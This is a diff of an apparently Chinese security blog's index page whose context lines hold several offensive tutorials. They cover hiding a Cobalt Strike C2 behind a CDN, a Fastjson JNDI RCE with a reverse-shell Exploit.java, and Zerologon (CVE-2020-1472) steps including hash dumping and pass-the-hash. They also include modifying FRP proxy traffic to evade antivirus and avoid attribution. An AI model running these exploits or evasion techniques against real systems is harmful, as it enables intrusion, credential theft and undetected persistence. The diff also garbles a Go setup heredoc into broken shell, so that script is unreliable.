@@ -238,26 +238,10 @@
   
   <div class="article-entry" itemprop="articleBody">
     
-    <h2><span id="c2隐匿">C2隐匿</span></h2><p>其实C2隐匿技术有很多，比如CDN域前置，修改c2.profile，添加新的证书，外置C2服务器（Heroku）等等。<br>但自己实际做到的也只有修改c2.profile文件，更换默认证书和改个端口了。昨天看到公众号上发了白嫖cdn隐匿c2服务器的文章，每两分钟就删除了。。<br>今天看到公众号上又发了这篇文章，所以赶快白嫖去了，yyds~</p>
-<p>公众号原文链接：<a href="https://mp.weixin.qq.com/s/S_REwcYlJGpyiJb3PIwsOQ" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/S_REwcYlJGpyiJb3PIwsOQ</a></p>
-<h2><span id="注册免费域名">注册免费域名</span></h2><p><a href="https://www.freenom.com/" target="_blank" rel="noopener">https://www.freenom.com/</a></p>
-<p>这个站最好是挂美国的代理去注册，不过我的梯子在美国的节点貌似被这个站给拉黑了，所以就只能直接去注册域名了。<br>不过还是需要一个插件<code>Gooreplacer</code> , 这个直接去谷歌商城去下载就好了。然后配置下重定向：</p>
-<pre class="line-numbers language-python"><code class="language-python">www<span class="token punctuation">.</span>google<span class="token punctuation">.</span>com<span class="token operator">/</span>recaptcha       <span class="token comment" spellcheck="true">#匹配模式</span>
-
-www<span class="token punctuation">.</span>recaptcha<span class="token punctuation">.</span>net<span class="token operator">/</span>recaptcha    <span class="token comment" spellcheck="true">#目标地址</span>
-
-<span class="token operator">-</span><span class="token operator">-</span> 其他默认<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>国内具体注册步骤：<br><a href="https://www.bilibili.com/video/BV1NK4y1P7tW?from=search&amp;seid=14191777004779154930" target="_blank" rel="noopener">https://www.bilibili.com/video/BV1NK4y1P7tW?from=search&amp;seid=14191777004779154930</a></p>
-<p><img src="/images/17/1.png" alt></p>
-<h2><span id="设置cdn解析">设置CDN解析</span></h2><p><a href="https://dash.cloudflare.com/login" target="_blank" rel="noopener">https://dash.cloudflare.com/login</a></p>
-<p>这里注册后增加自己刚才注册的域名，使用免费的套餐。最后在DNS解析中添加一条A记录，解析到自己的VPS。最后设置缓存打开，增加访问速度。</p>
-<p><img src="/images/17/2.png" alt></p>
-<h2><span id="设置监听">设置监听</span></h2><p>最后设置下cs的监听，需要注意cdn可支持端口</p>
-<pre class="line-numbers language-python"><code class="language-python">http<span class="token punctuation">:</span><span class="token number">80</span><span class="token punctuation">,</span><span class="token number">8080</span><span class="token punctuation">,</span><span class="token number">8880</span><span class="token punctuation">,</span><span class="token number">2052</span><span class="token punctuation">,</span><span class="token number">2082</span><span class="token punctuation">,</span><span class="token number">2086</span><span class="token punctuation">,</span><span class="token number">2095</span>
-https<span class="token punctuation">:</span><span class="token number">43</span><span class="token punctuation">,</span><span class="token number">2053</span><span class="token punctuation">,</span><span class="token number">2083</span><span class="token punctuation">,</span><span class="token number">2087</span><span class="token punctuation">,</span><span class="token number">2096</span><span class="token punctuation">,</span><span class="token number">8443</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<p>host和hosts填写自己注册的域名即可。<br>最终效果</p>
-<p><img src="/images/17/CDN.png" alt></p>
-
+    <h2 id="C2隐匿"><a href="#C2隐匿" class="headerlink" title="C2隐匿"></a>C2隐匿</h2><p>其实C2隐匿技术有很多，比如CDN域前置，修改c2.profile，添加新的证书，外置C2服务器（Heroku）等等。<br>但自己实际做到的也只有修改c2.profile文件，更换默认证书和改个端口了。昨天看到公众号上发了白嫖cdn隐匿c2服务器的文章，每两分钟就删除了。。<br>今天看到公众号上又发了这篇文章，所以赶快白嫖去了，yyds~</p>
+    
+    <a class="article-more-a" href="/2021/04/26/域名+CDN隐匿C2服务器/#more">more >></a>
+    
     
 
     
@@ -455,11 +439,11 @@ https<span class="token punctuation">:</span><span class="token number">43</span
         		</li>
       		 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">Web安全</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">提权</a>
         		</li>
       		 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">提权</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">Web安全</a>
         		</li>
       		
 		</ul>
@@ -507,7 +491,7 @@ https<span class="token punctuation">:</span><span class="token number">43</span
   
     <h1 itemprop="name">
 	
-	  <a class="article-title" href="/2021/04/25/面试/" target="_blank">面试过程</a>
+	  <a class="article-title" href="/2021/04/25/面试/" target="_blank">面试总结</a>
   
     </h1>
   
@@ -584,7 +568,7 @@ https<span class="token punctuation">:</span><span class="token number">43</span
   
     <h1 itemprop="name">
 	
-	  <a class="article-title" href="/2021/04/25/16/" target="_blank">内网渗透-PowerShell免杀制作[过火绒，360和Windows Defender]</a>
+	  <a class="article-title" href="/2021/04/25/16/" target="_blank">内网渗透-PowerShell免杀制作(过火绒，360和Windows Defender)</a>
   
     </h1>
   
@@ -624,11 +608,11 @@ https<span class="token punctuation">:</span><span class="token number">43</span
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">内网渗透</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">漏洞复现</a>
         		</li>
       		 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">漏洞复现</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">内网渗透</a>
         		</li>
       		
 		</ul>
@@ -708,18 +692,18 @@ https<span class="token punctuation">:</span><span class="token number">43</span
   
   <div class="article-entry" itemprop="articleBody">
     
-    <h2 id="Fastjson是什么"><a href="#Fastjson是什么" class="headerlink" title="Fastjson是什么"></a>Fastjson是什么</h2><ul>
+    <h2><span id="fastjson是什么">Fastjson是什么</span></h2><ul>
 <li><p><strong>Fastjson</strong>是阿里巴巴开源JSON解析库，他可以解析JSON格式的字符串。支持将Java Bean序列化为JSON字符串，也可以从JSON字符串反序列化到JavaBean。</p>
 </li>
 <li><p><strong>Fastjson</strong>提供了autotype功能，在请求过程中，我们可以在请求包中通过修改@type的值，来反序列化为指定的类型，而fastjson在反序列化过程中会设置和获取类中的属性，如果类中存在恶意方法，就会导致代码执行等这类问题。</p>
 </li>
 </ul>
-<h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><h3 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h3><ul>
+<h2><span id="复现">复现</span></h2><h3><span id="复现环境">复现环境</span></h3><ul>
 <li>靶机  ：192.168.30.51</li>
 <li>攻击机：192.168.30.16</li>
 </ul>
 <p>RCE：<a href="https://github.com/CaijiOrz/fastjson-1.2.47-RCE" target="_blank" rel="noopener">https://github.com/CaijiOrz/fastjson-1.2.47-RCE</a></p>
-<h3 id="探测能否利用"><a href="#探测能否利用" class="headerlink" title="探测能否利用"></a>探测能否利用</h3><p>payload：</p>
+<h3><span id="探测能否利用">探测能否利用</span></h3><p>payload：</p>
 <pre class="line-numbers language-python"><code class="language-python"><span class="token punctuation">{</span>
     <span class="token string">"name"</span><span class="token punctuation">:</span><span class="token string">"menghao"</span><span class="token punctuation">,</span>
     <span class="token string">"age"</span><span class="token punctuation">:</span><span class="token number">12</span>
@@ -733,13 +717,13 @@ https<span class="token punctuation">:</span><span class="token number">43</span
     <span class="token punctuation">}</span>
 <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p><img src="/images/15/2.png" alt></p>
-<h3 id="准备LDAP服务"><a href="#准备LDAP服务" class="headerlink" title="准备LDAP服务"></a>准备LDAP服务</h3><p><strong>将marshalsec-0.0.3-SNAPSHOT-all.jar文件和Exploit.java放在同一目录下</strong><br>在当前目录下运行LDAP服务,修改IP为当前这台服务器的IP</p>
+<h3><span id="准备ldap服务">准备LDAP服务</span></h3><p><strong>将marshalsec-0.0.3-SNAPSHOT-all.jar文件和Exploit.java放在同一目录下</strong><br>在当前目录下运行LDAP服务,修改IP为当前这台服务器的IP</p>
 <pre class="line-numbers language-java"><code class="language-java">java <span class="token operator">-</span>cp marshalsec<span class="token operator">-</span><span class="token number">0.0</span><span class="token punctuation">.</span><span class="token number">3</span><span class="token operator">-</span>SNAPSHOT<span class="token operator">-</span>all<span class="token punctuation">.</span>jar marshalsec<span class="token punctuation">.</span>jndi<span class="token punctuation">.</span>LDAPRefServer http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">30.16</span><span class="token operator">:</span><span class="token number">1111</span><span class="token operator">/</span>#Exploit <span class="token number">9999</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="/images/15/3.png" alt></p>
-<h3 id="准备Web服务"><a href="#准备Web服务" class="headerlink" title="准备Web服务"></a>准备Web服务</h3><p>在当前目录下使用python搭建Web服务</p>
+<h3><span id="准备web服务">准备Web服务</span></h3><p>在当前目录下使用python搭建Web服务</p>
 <pre class="line-numbers language-java"><code class="language-java">python <span class="token operator">-</span>m http<span class="token punctuation">.</span>server <span class="token number">1111</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="/images/15/4.png" alt></p>
-<h3 id="修改Exploit并编译成class文件"><a href="#修改Exploit并编译成class文件" class="headerlink" title="修改Exploit并编译成class文件"></a>修改Exploit并编译成class文件</h3><p>修改Exploit.java中的反弹IP和端口（准备接收反弹SHELL的服务器IP和监听端口）</p>
+<h3><span id="修改exploit并编译成class文件">修改Exploit并编译成class文件</span></h3><p>修改Exploit.java中的反弹IP和端口（准备接收反弹SHELL的服务器IP和监听端口）</p>
 <p>Exploit.java</p>
 <pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>BufferedReader<span class="token punctuation">;</span>
 <span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>InputStream<span class="token punctuation">;</span>
@@ -769,7 +753,7 @@ https<span class="token punctuation">:</span><span class="token number">43</span
 <p>编译Exploit.java</p>
 <pre class="line-numbers language-java"><code class="language-java">javac Exploit<span class="token punctuation">.</span>java<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="/images/15/6.png" alt></p>
-<h3 id="使用EXP获取Shell"><a href="#使用EXP获取Shell" class="headerlink" title="使用EXP获取Shell"></a>使用EXP获取Shell</h3><pre class="line-numbers language-java"><code class="language-java"><span class="token punctuation">{</span>
+<h3><span id="使用exp获取shell">使用EXP获取Shell</span></h3><pre class="line-numbers language-java"><code class="language-java"><span class="token punctuation">{</span>
     <span class="token string">"name"</span><span class="token operator">:</span><span class="token punctuation">{</span>
         <span class="token string">"@type"</span><span class="token operator">:</span><span class="token string">"java.lang.Class"</span><span class="token punctuation">,</span>
         <span class="token string">"val"</span><span class="token operator">:</span><span class="token string">"com.sun.rowset.JdbcRowSetImpl"</span>
@@ -782,7 +766,7 @@ https<span class="token punctuation">:</span><span class="token number">43</span
 
 <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>静等shell<del>~</del>(复现时虚拟机ping不通物理机时关闭本机防火墙即可)<br><img src="/images/15/7.png" alt><br><img src="/images/15/8.png" alt></p>
-<h3 id="Burp-自动探测Fastjson反序列化-脚本"><a href="#Burp-自动探测Fastjson反序列化-脚本" class="headerlink" title="Burp 自动探测Fastjson反序列化 脚本"></a>Burp 自动探测Fastjson反序列化 脚本</h3><p><a href="https://github.com/Maskhe/FastjsonScan" target="_blank" rel="noopener">https://github.com/Maskhe/FastjsonScan</a></p>
+<h3><span id="burp-自动探测fastjson反序列化-脚本">Burp 自动探测Fastjson反序列化 脚本</span></h3><p><a href="https://github.com/Maskhe/FastjsonScan" target="_blank" rel="noopener">https://github.com/Maskhe/FastjsonScan</a></p>
 <p>在平时抓包时右键 Send FastjsonScan 即可探测是否存在。<br><img src="/images/15/9.png" alt></p>
 
     
@@ -880,10 +864,10 @@ https<span class="token punctuation">:</span><span class="token number">43</span
   
   <div class="article-entry" itemprop="articleBody">
     
-    <h2 id="CVE-2020-1472"><a href="#CVE-2020-1472" class="headerlink" title="CVE-2020-1472"></a>CVE-2020-1472</h2><blockquote>
+    <h2><span id="cve-2020-1472">CVE-2020-1472</span></h2><blockquote>
 <p>2020年08月12日， 360CERT监测发现Windows官方 发布了 NetLogon 特权提升漏洞 的风险通告，该漏洞编号为 CVE-2020-1472，漏洞等级：严重，漏洞评分：10分。<br>攻击者通过NetLogon（MS-NRPC），建立与域控间易受攻击的安全通道时，可利用此漏洞获取域管访问权限。成功利用此漏洞的攻击者可以在该网络中的设备上运行经特殊设计的应用程序。<br>对此，360CERT建议广大用户及时为各Windows Server操作系统安装最新相关补丁。与此同时，请做好资产自查以及预防工作，以免遭受黑客攻击。</p>
 </blockquote>
-<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><pre class="line-numbers language-python"><code class="language-python">Windows Server <span class="token number">2008</span> R2 <span class="token keyword">for</span> x64<span class="token operator">-</span>based Systems Service Pack <span class="token number">1</span>
+<h2><span id="影响版本">影响版本</span></h2><pre class="line-numbers language-python"><code class="language-python">Windows Server <span class="token number">2008</span> R2 <span class="token keyword">for</span> x64<span class="token operator">-</span>based Systems Service Pack <span class="token number">1</span>
 Windows Server <span class="token number">2008</span> R2 <span class="token keyword">for</span> x64<span class="token operator">-</span>based Systems Service Pack <span class="token number">1</span> <span class="token punctuation">(</span>Server Core installation<span class="token punctuation">)</span>
 Windows Server <span class="token number">2012</span>
 Windows Server <span class="token number">2012</span> <span class="token punctuation">(</span>Server Core installation<span class="token punctuation">)</span>
@@ -896,17 +880,17 @@ Windows Server <span class="token number">2019</span> <span class="token punctua
 Windows Server<span class="token punctuation">,</span> version <span class="token number">1903</span> <span class="token punctuation">(</span>Server Core installation<span class="token punctuation">)</span>
 Windows Server<span class="token punctuation">,</span> version <span class="token number">1909</span> <span class="token punctuation">(</span>Server Core installation<span class="token punctuation">)</span>
 Windows Server<span class="token punctuation">,</span> version <span class="token number">2004</span> <span class="token punctuation">(</span>Server Core installation<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>EXP：<br><a href="https://github.com/dirkjanm/CVE-2020-1472" target="_blank" rel="noopener">https://github.com/dirkjanm/CVE-2020-1472</a><br><a href="https://github.com/SecureAuthCorp/impacket" target="_blank" rel="noopener">https://github.com/SecureAuthCorp/impacket</a><br><a href="https://github.com/SecuraBV/CVE-2020-1472/" target="_blank" rel="noopener">https://github.com/SecuraBV/CVE-2020-1472/</a></p>
+<h2><span id="复现">复现</span></h2><p>EXP：<br><a href="https://github.com/dirkjanm/CVE-2020-1472" target="_blank" rel="noopener">https://github.com/dirkjanm/CVE-2020-1472</a><br><a href="https://github.com/SecureAuthCorp/impacket" target="_blank" rel="noopener">https://github.com/SecureAuthCorp/impacket</a><br><a href="https://github.com/SecuraBV/CVE-2020-1472/" target="_blank" rel="noopener">https://github.com/SecuraBV/CVE-2020-1472/</a></p>
 <p>靶机ip：192.168.21.109 （win server 2012 r2）</p>
-<h3 id="首先在进入内网环境下获取到域控服务器的NetBIOS名称"><a href="#首先在进入内网环境下获取到域控服务器的NetBIOS名称" class="headerlink" title="首先在进入内网环境下获取到域控服务器的NetBIOS名称"></a>首先在进入内网环境下获取到域控服务器的NetBIOS名称</h3><pre class="line-numbers language-python"><code class="language-python">nbtstat <span class="token operator">-</span>A DC_IP<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h3><span id="首先在进入内网环境下获取到域控服务器的netbios名称">首先在进入内网环境下获取到域控服务器的NetBIOS名称</span></h3><pre class="line-numbers language-python"><code class="language-python">nbtstat <span class="token operator">-</span>A DC_IP<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="/images/14/1.png" alt></p>
-<h3 id="检测目标是否能够利用此漏洞"><a href="#检测目标是否能够利用此漏洞" class="headerlink" title="检测目标是否能够利用此漏洞"></a>检测目标是否能够利用此漏洞</h3><pre class="line-numbers language-python"><code class="language-python">python <span class="token punctuation">.</span>\zerologon_tester<span class="token punctuation">.</span>py DC <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">21.109</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h3><span id="检测目标是否能够利用此漏洞">检测目标是否能够利用此漏洞</span></h3><pre class="line-numbers language-python"><code class="language-python">python <span class="token punctuation">.</span>\zerologon_tester<span class="token punctuation">.</span>py DC <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">21.109</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="/images/14/2.png" alt></p>
-<h3 id="将域控服务器中的机器账户密码打空"><a href="#将域控服务器中的机器账户密码打空" class="headerlink" title="将域控服务器中的机器账户密码打空"></a>将域控服务器中的机器账户密码打空</h3><pre class="line-numbers language-python"><code class="language-python">python <span class="token punctuation">.</span>\cve<span class="token number">-2020</span><span class="token operator">-</span><span class="token number">1472</span><span class="token operator">-</span>exploit<span class="token punctuation">.</span>py DC <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">21.109</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h3><span id="将域控服务器中的机器账户密码打空">将域控服务器中的机器账户密码打空</span></h3><pre class="line-numbers language-python"><code class="language-python">python <span class="token punctuation">.</span>\cve<span class="token number">-2020</span><span class="token operator">-</span><span class="token number">1472</span><span class="token operator">-</span>exploit<span class="token punctuation">.</span>py DC <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">21.109</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="/images/14/3.png" alt></p>
-<h3 id="获取目标机器中所有用户的hash"><a href="#获取目标机器中所有用户的hash" class="headerlink" title="获取目标机器中所有用户的hash"></a>获取目标机器中所有用户的hash</h3><pre class="line-numbers language-python"><code class="language-python">python <span class="token punctuation">.</span>\secretsdump<span class="token punctuation">.</span>py de1ay<span class="token punctuation">.</span>com<span class="token operator">/</span>DC$@<span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">21.109</span> <span class="token operator">-</span>no<span class="token operator">-</span><span class="token keyword">pass</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h3><span id="获取目标机器中所有用户的hash">获取目标机器中所有用户的hash</span></h3><pre class="line-numbers language-python"><code class="language-python">python <span class="token punctuation">.</span>\secretsdump<span class="token punctuation">.</span>py de1ay<span class="token punctuation">.</span>com<span class="token operator">/</span>DC$@<span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">21.109</span> <span class="token operator">-</span>no<span class="token operator">-</span><span class="token keyword">pass</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="/images/14/4.png" alt></p>
-<h3 id="使用Administrator用户登陆de1ay域"><a href="#使用Administrator用户登陆de1ay域" class="headerlink" title="使用Administrator用户登陆de1ay域"></a>使用Administrator用户登陆de1ay域</h3><pre class="line-numbers language-python"><code class="language-python">python wmiexec<span class="token punctuation">.</span>py <span class="token operator">-</span>hashes aad3b435b51404eeaad3b435b51404ee<span class="token punctuation">:</span><span class="token number">161cff084477fe596a5db81874498a24</span> de1ay<span class="token punctuation">.</span>com<span class="token operator">/</span>Administrator@<span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">21.109</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h3><span id="使用administrator用户登陆de1ay域">使用Administrator用户登陆de1ay域</span></h3><pre class="line-numbers language-python"><code class="language-python">python wmiexec<span class="token punctuation">.</span>py <span class="token operator">-</span>hashes aad3b435b51404eeaad3b435b51404ee<span class="token punctuation">:</span><span class="token number">161cff084477fe596a5db81874498a24</span> de1ay<span class="token punctuation">.</span>com<span class="token operator">/</span>Administrator@<span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">21.109</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="/images/14/5.png" alt></p>
 <p>这个Hash也可解出来<br><img src="/images/14/6.png" alt><br><img src="/images/14/7.png" alt><br>后续恢复密码<br><a href="https://www.cnblogs.com/Yang34/p/13678632.html" target="_blank" rel="noopener">https://www.cnblogs.com/Yang34/p/13678632.html</a></p>
 <p>具体原理<br><a href="https://blog.csdn.net/smellycat000/article/details/108633744" target="_blank" rel="noopener">https://blog.csdn.net/smellycat000/article/details/108633744</a></p>
@@ -926,11 +910,11 @@ Windows Server<span class="token punctuation">,</span> version <span class="toke
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">内网渗透</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">漏洞复现</a>
         		</li>
       		 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">漏洞复现</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">内网渗透</a>
         		</li>
       		
 		</ul>
@@ -1010,8 +994,8 @@ Windows Server<span class="token punctuation">,</span> version <span class="toke
   
   <div class="article-entry" itemprop="articleBody">
     
-    <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在拿下一台机器作为入口时，内网代理就变得尤为重要。他是我们进行横向渗透一个中间人，没了代理在内网中就寸步难行。而内网穿透的工具有很多，比如frp，reGeorg等等非常优秀的代理工具。使用方法不在赘述，这篇文章主要记录下在FRP内网代理时的流量改造。FRP作为一个开源的项目，它的特征早已被各大厂商掌握了，不进行流量上的改变我们就无法成功的建立连接，如果直接使用github编译后的EXE直接会被360等杀软直接判定为黑客行为，流量改造也是为了能够达到一定程度上的免杀效果。</p>
-<h2 id="改造前的流量"><a href="#改造前的流量" class="headerlink" title="改造前的流量"></a>改造前的流量</h2><p>在frp默认配置文件 frpc.ini中不开启 tls_enable = true 时，客户端在连接服务端时会把版本信息传给服务端进行认证。下面是在连接时wires hark抓包的流量</p>
+    <h1><span id="前言">前言</span></h1><p>在拿下一台机器作为入口时，内网代理就变得尤为重要。他是我们进行横向渗透一个中间人，没了代理在内网中就寸步难行。而内网穿透的工具有很多，比如frp，reGeorg等等非常优秀的代理工具。使用方法不在赘述，这篇文章主要记录下在FRP内网代理时的流量改造。FRP作为一个开源的项目，它的特征早已被各大厂商掌握了，不进行流量上的改变我们就无法成功的建立连接，如果直接使用github编译后的EXE直接会被360等杀软直接判定为黑客行为，流量改造也是为了能够达到一定程度上的免杀效果。</p>
+<h2><span id="改造前的流量">改造前的流量</span></h2><p>在frp默认配置文件 frpc.ini中不开启 tls_enable = true 时，客户端在连接服务端时会把版本信息传给服务端进行认证。下面是在连接时wires hark抓包的流量</p>
 <p><img src="/images/13/1.png" alt></p>
 <p>可以看见非常明显的frp流量特征</p>
 <pre class="line-numbers language-python"><code class="language-python"><span class="token string">"version"</span><span class="token punctuation">,</span><span class="token string">"host name"</span><span class="token punctuation">,</span><span class="token string">"user"</span><span class="token punctuation">,</span><span class="token string">"arch"</span><span class="token punctuation">,</span><span class="token string">"privilege_key"</span><span class="token punctuation">,</span><span class="token string">"times tamp"</span><span class="token punctuation">,</span><span class="token string">"run id"</span><span class="token punctuation">,</span><span class="token string">"metas"</span><span class="token punctuation">,</span><span class="token string">"pool_count"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
@@ -1027,7 +1011,7 @@ Windows Server<span class="token punctuation">,</span> version <span class="toke
 <p><img src="/images/13/4.png" alt></p>
 <p>修改为3.14.15</p>
 <p><img src="/images/13/5.png" alt></p>
-<h2 id="客户端连接"><a href="#客户端连接" class="headerlink" title="客户端连接"></a>客户端连接</h2><p>如果按照正常的客户端连接方式，我们需要一个frpc.ini配置文件，这里会暴露我们的代理服务器，如果被溯源问题就大了。</p>
+<h2><span id="客户端连接">客户端连接</span></h2><p>如果按照正常的客户端连接方式，我们需要一个frpc.ini配置文件，这里会暴露我们的代理服务器，如果被溯源问题就大了。</p>
 <pre class="line-numbers language-python"><code class="language-python"><span class="token punctuation">[</span>common<span class="token punctuation">]</span>
 server_addr <span class="token operator">=</span> xxx<span class="token punctuation">.</span>xxx<span class="token punctuation">.</span>xxx<span class="token punctuation">.</span>xxx
 server_port <span class="token operator">=</span> <span class="token number">4444</span>
@@ -1061,7 +1045,7 @@ rootCmd<span class="token punctuation">.</span>PersistentFlags<span class="token
 <p><img src="/images/13/7.png" alt></p>
 <p>最后需要在 runClient()函数下调用我们自定义的函数getFileContent()<br><img src="/images/13/8.png" alt></p>
 <p>注意一下参数的接收和代码的注释。</p>
-<h2 id="Go环境搭建编译frp"><a href="#Go环境搭建编译frp" class="headerlink" title="Go环境搭建编译frp"></a>Go环境搭建编译frp</h2><p>这里学弟搞得一键搭建QAQ，不过注意要在 /root/ 目录下运行该脚本</p>
+<h2><span id="go环境搭建编译frp">Go环境搭建编译frp</span></h2><p>这里学弟搞得一键搭建QAQ，不过注意要在 /root/ 目录下运行该脚本</p>
 <pre class="line-numbers language-sh"><code class="language-sh">go_tar_gz="go1.15.5.linux-amd64.tar.gz"
 
 go_url="https://dl.google.com/go/${go_tar_gz}"
@@ -1073,7 +1057,7 @@ rm  ${go_tar_gz}
 
 # go语言 添加环境变量
 
-cat <<EOF >> ~/.profile
+cat <<eof>> ~/.profile
 export GOROOT=/root/go
 export GOPATH=/root/go/work
 export PATH=$PATH:/root/go/bin
@@ -1088,7 +1072,7 @@ mkdir -p /root/go/work
 mkdir -p ~/helloworld
 cd ~/helloworld
 
-cat <<EOF > helloworld.go
+cat <<eof> helloworld.go
 
 // Test that we can do page 1 of the C book.
 
@@ -1101,18 +1085,18 @@ EOF
 
 go build
 
-./helloworld<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+./helloworld<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></eof></eof></code></pre>
 <p>我这里使用的kali安装的Go环境，使用<code>go version</code>检测是否成功<br><img src="/images/13/9.png" alt></p>
 <p>如果不成功可能是环境变量文件没有刷新，刷新一下就好了</p>
 <pre class="line-numbers language-python"><code class="language-python">source <span class="token operator">~</span><span class="token operator">/</span><span class="token punctuation">.</span>profile<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<h3 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h3><p>之后把修改过后的frp源码拖到 go/work/ 目录下，修改 Makefile.cross-compiles 文件，添加</p>
+<h3><span id="编译">编译</span></h3><p>之后把修改过后的frp源码拖到 go/work/ 目录下，修改 Makefile.cross-compiles 文件，添加</p>
 <pre class="line-numbers language-python"><code class="language-python">export GOPROXY<span class="token operator">=</span>https<span class="token punctuation">:</span><span class="token operator">//</span>goproxy<span class="token punctuation">.</span>cn<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>之所以添加<code>export GOPROXY=https://goproxy.cn</code>是因为在国内，go语言的这个包的网站是被禁止的，我们无法直接访问。</p>
 <p>修改完成之后就可以对其进行编译了。</p>
 <pre class="line-numbers language-python"><code class="language-python">make <span class="token operator">-</span>f Makefile<span class="token punctuation">.</span>cross<span class="token operator">-</span>compiles<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>编译出的各种版本如下</p>
 <p><img src="/images/13/10.png" alt></p>
-<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><p>内网网段：<br>win7 192.168.111.2<br>kali 192.168.111.3 （有Web服务，仅内网访问）</p>
+<h2><span id="测试">测试</span></h2><h3><span id="环境">环境</span></h3><p>内网网段：<br>win7 192.168.111.2<br>kali 192.168.111.3 （有Web服务，仅内网访问）</p>
 <p>模拟公网网段：<br>win7 192.168.10.19（桥接）</p>
 <p>实验的时候需要把物理机中自定义的内网网段的网卡禁用掉。</p>
 <p>将编译后的frps_linux_386上传到公网VPS中，创建frps.ini文件，写入</p>
@@ -1129,7 +1113,7 @@ bind_port <span class="token operator">=</span> <span class="token number">9998<
 <p>成功访问了内网kali的Web服务，ssh服务也可以连上。</p>
 <p>关闭进程</p>
 <pre class="line-numbers language-python"><code class="language-python">shell taskkill <span class="token operator">/</span>f <span class="token operator">/</span>t <span class="token operator">/</span>im frpc_windows_386<span class="token punctuation">.</span>exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
